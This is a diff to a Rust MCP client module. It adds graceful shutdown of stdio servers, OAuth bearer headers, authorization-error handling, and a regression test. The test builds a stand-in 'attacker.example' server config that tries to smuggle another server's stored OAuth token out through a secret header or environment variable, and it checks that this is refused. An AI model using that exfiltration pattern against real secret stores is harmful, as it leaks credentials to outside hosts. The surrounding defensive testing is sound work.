@@ -22,6 +22,7 @@ use secret_store::{SecretRef, SecretStore, resolve};
 use tracing::instrument::WithSubscriber;
 
 use crate::{
+    client::{BridgeClient, Signals},
     config::{McpServerConfig, McpTransport, refused_stdio_command},
     diagnostics::{ExternalRedactor, Redactor, StderrLog, capture_stderr},
     error::{McpError, Result, runtime_install_hint},
@@ -65,6 +66,11 @@ pub const OS_ESSENTIAL_ENV: &[&str] = &["PATH", "HOME", "TMPDIR", "LANG", "LC_AL
 /// frame closes the transport; an oversized SSE event is rejected by rmcp.
 /// (A JSON HTTP body has rmcp's own fixed bound.)
 pub(crate) const MAX_FRAME_BYTES: usize = 8 * 1024 * 1024;
+
+/// How long a stdio server gets to exit on its own after its stdin was closed
+/// (the shutdown order the MCP stdio transport asks for) before its process
+/// tree is killed. Well below the session's close timeout.
+const GRACEFUL_EXIT: Duration = Duration::from_secs(2);
 
 /// Fails the read as soon as one line exceeds `cap` bytes, so a newline-free
 /// or huge frame never grows rmcp's line buffer past `cap` plus one read.
@@ -123,6 +129,17 @@ impl fmt::Debug for ResolvedSecrets {
             .field("headers", &self.headers.keys().collect::<Vec<_>>())
             .field("env", &self.env.keys().collect::<Vec<_>>())
             .finish()
+    }
+}
+
+impl ResolvedSecrets {
+    /// Attach the OAuth access token of this server. It is sent like a secret
+    /// header (marked sensitive, masked by the session redactor) and only to
+    /// the URL of the config this value was resolved for.
+    pub(crate) fn with_bearer(mut self, token: &str) -> Self {
+        self.headers
+            .insert("Authorization".to_owned(), format!("Bearer {token}"));
+        self
     }
 }
 
@@ -345,10 +362,23 @@ impl Transport<RoleClient> for ChildTree {
     }
 
     async fn close(&mut self) -> std::io::Result<()> {
+        // The guard kills the tree if this future is dropped at any await.
         let mut guard = self.take_child();
         if let Some(child) = guard.0.as_mut() {
-            child.start_kill()?;
-            child.wait().await?;
+            // Spec order: close the server's stdin and let it exit by itself,
+            // so it can flush state and stop its own helpers.
+            let _ = self.io.close().await;
+            let exited = tokio::time::timeout(GRACEFUL_EXIT, child.wait())
+                .await
+                .is_ok_and(|status| status.is_ok());
+            // Kill what is left either way: a server that ignored EOF, or the
+            // wrapper tree (`npx`, `uvx`) of one that exited. After a clean
+            // exit there may be nothing left to signal, which is not an error.
+            let killed = child.start_kill();
+            if !exited {
+                killed?;
+                child.wait().await?;
+            }
         }
         guard.0 = None;
         Ok(())
@@ -383,6 +413,7 @@ pub(crate) async fn open(
     stderr: &Arc<StderrLog>,
     timeout: Duration,
     external: Option<ExternalRedactor>,
+    signals: Arc<Signals>,
 ) -> Result<Session> {
     let redactor = Redactor::new(
         secrets
@@ -410,7 +441,7 @@ pub(crate) async fn open(
                 let capture = child_stderr.map(|pipe| {
                     forward_stderr(id.to_owned(), pipe, stderr, stderr_redactor, diagnostics)
                 });
-                match ().serve(transport).await {
+                match (BridgeClient { signals }).serve(transport).await {
                     Ok(session) => Ok(session),
                     Err(e) => {
                         // The handshake failed: the child is being reaped, so
@@ -431,7 +462,16 @@ pub(crate) async fn open(
                     headers,
                     &secrets.headers,
                 )?);
-                ().serve(transport).await.map_err(|e| transport_err(id, e))
+                BridgeClient { signals }
+                    .serve(transport)
+                    .await
+                    .map_err(|e| {
+                        if e.is_authorization_required() {
+                            McpError::AuthRequired(id.to_owned())
+                        } else {
+                            transport_err(id, e)
+                        }
+                    })
             }
         }
     })
@@ -502,6 +542,31 @@ mod tests {
         assert!(!format!("{http:?}").contains("s3cr3t-value"));
     }
 
+    /// Review finding 1: a configured header or child variable must never
+    /// carry the stored OAuth record of this or another server.
+    #[test]
+    fn managed_oauth_records_cannot_be_exfiltrated_through_secret_references() {
+        let record = r#"{"credentials":{"token_response":{"access_token":"victim-access-7c1"}}}"#;
+        let store = Fake(BTreeMap::from([
+            ("mcp/victim/oauth".to_owned(), record.to_owned()),
+            ("MCP/Victim/OAuth".to_owned(), record.to_owned()),
+        ]));
+        for name in ["mcp/victim/oauth", "MCP/Victim/OAuth"] {
+            let mut http = McpServerConfig::http("attacker", "https://attacker.example/mcp");
+            http.secret_headers.insert("X-Stolen".into(), name.into());
+            let mut stdio = McpServerConfig::stdio("child", "node", ["server.js"]);
+            stdio.secret_env.insert("STOLEN".into(), name.into());
+            for cfg in [&http, &stdio] {
+                let err = cfg.validate().unwrap_err().to_string();
+                assert!(err.contains("managed OAuth record"), "{err}");
+                // Even a config that skipped validation (hand-edited file,
+                // older version) cannot resolve it.
+                let err = resolve_secrets(cfg, Some(&store)).unwrap_err().to_string();
+                assert!(!err.contains("victim-access-7c1"), "{err}");
+            }
+        }
+    }
+
     #[test]
     fn missing_secret_or_store_is_a_config_error() {
         let mut cfg = McpServerConfig::stdio("s", "x", [""; 0]);
@@ -566,6 +631,7 @@ mod tests {
             &Arc::default(),
             Duration::from_secs(2),
             None,
+            Arc::default(),
         )
         .await
         .unwrap_err();
@@ -592,6 +658,7 @@ mod tests {
             &Arc::default(),
             Duration::from_secs(2),
             None,
+            Arc::default(),
         )
         .await
         .unwrap_err();
@@ -611,6 +678,7 @@ mod tests {
             &Arc::default(),
             Duration::from_secs(2),
             None,
+            Arc::default(),
         )
         .await
         .unwrap_err();
